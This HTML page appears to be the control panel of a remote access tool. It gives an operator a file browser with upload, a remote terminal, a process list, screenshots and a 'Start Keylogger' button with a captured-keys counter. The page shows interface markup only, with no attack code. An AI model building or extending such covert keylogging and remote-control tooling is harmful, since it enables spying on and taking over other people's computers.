<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Control Panel</title>
    <link rel="stylesheet" href="/assets/css/common.css">
    <link rel="stylesheet" href="/assets/css/client-details.css">
</head>
<body>
    <!-- HEADER -->
    <div class="header">
        <div>
            <h1>üñ•Ô∏è <span id="clientName">Client Control</span></h1>
        </div>
        <div class="header-right">
            <div>
                <span class="status-indicator online" id="statusIndicator"></span>
                <span id="clientStatus">Loading...</span>
            </div>
            <button class="close-btn" onclick="window.close()">Close</button>
        </div>
    </div>

    <!-- TAB NAVIGATION -->
    <div class="tabs">
        <button class="tab active" onclick="switchTab('overview')">üìä Overview</button>
        <button class="tab" onclick="switchTab('files')">üìÅ File Browser</button>
        <button class="tab" onclick="switchTab('terminal')">‚å®Ô∏è Terminal</button>
        <button class="tab" onclick="switchTab('processes')">‚öôÔ∏è Processes</button>
        <button class="tab" onclick="switchTab('info')">‚ÑπÔ∏è System Info</button>
        <button class="tab" onclick="switchTab('actions')">‚ö° Actions</button>
    </div>

    <!-- CONTENT AREA -->
    <div class="content-area">
        <!-- OVERVIEW TAB -->
        <div class="tab-content active" id="overview">
            <div class="stats-grid">
                <div class="stat-box">
                    <h4>CPU Usage</h4>
                    <div class="value" id="cpuUsage">0%</div>
                    <div class="detail" id="cpuDetail">Loading...</div>
                </div>
                <div class="stat-box">
                    <h4>Memory Usage</h4>
                    <div class="value" id="memUsage">0%</div>
                    <div class="detail" id="memDetail">Loading...</div>
                </div>
                <div class="stat-box">
                    <h4>Disk Usage</h4>
                    <div class="value" id="diskUsage">0%</div>
                    <div class="detail" id="diskDetail">Loading...</div>
                </div>
                <div class="stat-box">
                    <h4>Uptime</h4>
                    <div class="value" id="uptime">0d</div>
                    <div class="detail" id="uptimeDetail">Loading...</div>
                </div>
            </div>

            <div class="info-grid" style="flex: 1;">
                <div class="info-card">
                    <h4>üìã System Details</h4>
                    <div class="info-row">
                        <span class="info-label">Hostname:</span>
                        <span class="info-value" id="hostname">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">OS:</span>
                        <span class="info-value" id="osInfo">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Architecture:</span>
                        <span class="info-value" id="arch">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Processors:</span>
                        <span class="info-value" id="cpuCount">-</span>
                    </div>
                </div>

                <div class="info-card">
                    <h4>üåê Network</h4>
                    <div class="info-row">
                        <span class="info-label">Local IP:</span>
                        <span class="info-value" id="localIp">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Public IP:</span>
                        <span class="info-value" id="publicIp">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Connected:</span>
                        <span class="info-value" id="connected">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Last Sync:</span>
                        <span class="info-value" id="lastSync">-</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- FILE BROWSER TAB -->
        <div class="tab-content" id="files">
            <div class="file-container">
                <div class="toolbar">
                    <input type="text" class="path-input" id="filePath" placeholder="Enter file path...">
                    <button class="btn btn-primary btn-small" onclick="browseFolder()">Browse</button>
                    <button class="btn btn-secondary btn-small" id="drivesBtn" style="display: none;" onclick="toggleDrives()">üíæ Drives</button>
                    <button class="btn btn-secondary btn-small" onclick="uploadFile()">üì§ Upload</button>
                    <button class="btn btn-secondary btn-small" onclick="refreshFiles()">üîÑ Refresh</button>
                </div>
                <div id="drivesPanel" style="display: none; background: #10121a; border: 1px solid #1f2230; border-radius: 10px; padding: 14px; margin-bottom: 14px;">
                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px;">
                        <h4 style="margin: 0; color: #fff;">Available Drives</h4>
                        <button class="btn btn-secondary btn-small" onclick="toggleDrives()">Close</button>
                    </div>
                    <div id="drivesList" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px;">
                        <div style="text-align: center; padding: 12px; color: var(--text-light);">Loading drives...</div>
                    </div>
                </div>
                <div class="file-list">
                    <table>
                        <thead>
                            <tr>
                                <th style="width: 40%;">Name</th>
                                <th style="width: 15%;">Size</th>
                                <th style="width: 20%;">Modified</th>
                                <th style="width: 25%;">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="fileTableBody">
                            <tr><td colspan="4" style="text-align: center; padding: 40px;">Loading files...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- TERMINAL TAB -->
        <div class="tab-content" id="terminal">
            <div class="terminal">
                <div class="terminal-controls" style="background: var(--terminal-bg); padding: 10px; border-bottom: 1px solid #3e3e42; display: flex; gap: 10px;">
                    <button onclick="clearTerminal()" style="background: #0e639c; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Clear</button>
                    <button onclick="connectTerminal()" style="background: #28a745; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Connect</button>
                    <button onclick="disconnectTerminal()" style="background: #dc3545; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Disconnect</button>
                    <span id="terminalStatus" style="color: #888; font-size: 12px; align-self: center; margin-left: auto;">Not connected</span>
                </div>
                <div class="terminal-output" id="terminalOutput">
                    <div class="terminal-line">Welcome to Client Terminal</div>
                    <div class="terminal-line">Click 'Connect' to start terminal session</div>
                    <div class="terminal-line"></div>
                </div>
                <div class="terminal-input-area">
                    <span class="prompt">$</span>
                    <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command...">
                </div>
            </div>
        </div>

        <!-- PROCESSES TAB -->
        <div class="tab-content" id="processes">
            <div class="processes-section">
                <div class="toolbar">
                    <input type="text" placeholder="Search processes..." style="flex: 1;">
                    <button class="btn btn-secondary btn-small" onclick="refreshProcesses()">üîÑ Refresh</button>
                </div>
                <div class="process-list" id="processListContainer">
                    <div style="text-align: center; padding: 40px; color: var(--text-light);">
                        Loading processes...
                    </div>
                </div>
            </div>
        </div>

        <!-- SYSTEM INFO TAB -->
        <div class="tab-content" id="info">
            <div class="info-grid">
                <div class="info-card">
                    <h4>üíª System Information</h4>
                    <div class="info-row">
                        <span class="info-label">Hostname:</span>
                        <span class="info-value" id="info_hostname">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">OS:</span>
                        <span class="info-value" id="info_os">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Architecture:</span>
                        <span class="info-value" id="info_arch">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">CPU Cores:</span>
                        <span class="info-value" id="info_cpuCores">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Uptime:</span>
                        <span class="info-value" id="info_uptime">-</span>
                    </div>
                </div>

                <div class="info-card">
                    <h4>üíæ Memory</h4>
                    <div class="info-row">
                        <span class="info-label">Total:</span>
                        <span class="info-value" id="info_totalMem">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Available:</span>
                        <span class="info-value" id="info_availMem">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Used:</span>
                        <span class="info-value" id="info_usedMem">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Usage:</span>
                        <span class="info-value" id="info_memPercent">-</span>
                    </div>
                </div>

                <div class="info-card">
                    <h4>üíø Disk</h4>
                    <div class="info-row">
                        <span class="info-label">Total:</span>
                        <span class="info-value" id="info_diskTotal">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Used:</span>
                        <span class="info-value" id="info_diskUsed">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Free:</span>
                        <span class="info-value" id="info_diskFree">-</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Usage:</span>
                        <span class="info-value" id="info_diskPercent">-</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- ACTIONS TAB -->
        <div class="tab-content" id="actions">
            <div class="actions-section">
                <h3 style="margin-bottom: 20px;">Quick Actions</h3>
                <div class="actions-grid">
                    <button class="action-btn btn-primary" onclick="executeAction('screenshot')">üì∏ Screenshot</button>
                    <button class="action-btn btn-secondary" id="keyloggerBtn" onclick="executeAction('keylogger')">‚å®Ô∏è Start Keylogger</button>
                </div>
                
                <!-- Keylogger Status -->
                <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid var(--primary);">
                    <h4 style="margin: 0 0 10px 0;">‚å®Ô∏è Keylogger Status</h4>
                    <div style="display: grid; gap: 10px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <span style="color: var(--text-light);">Status:</span>
                            <span id="keyloggerStatus" style="font-weight: 600; color: var(--danger);">Stopped</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <span style="color: var(--text-light);">Keys Captured:</span>
                            <span id="keysCaptured" style="font-weight: 600;">0</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- MODALS -->
    <div class="modal" id="statusModal">
        <div class="modal-content">
            <h3 id="modalTitle">Status</h3>
            <p id="modalMessage"></p>
            <div class="modal-actions">
                <button class="btn btn-primary" onclick="closeModal()">OK</button>
            </div>
        </div>
    </div>

    <script src="/assets/js/common.js"></script>
    <script src="/assets/js/client-details.js"></script>
</body>
</html>
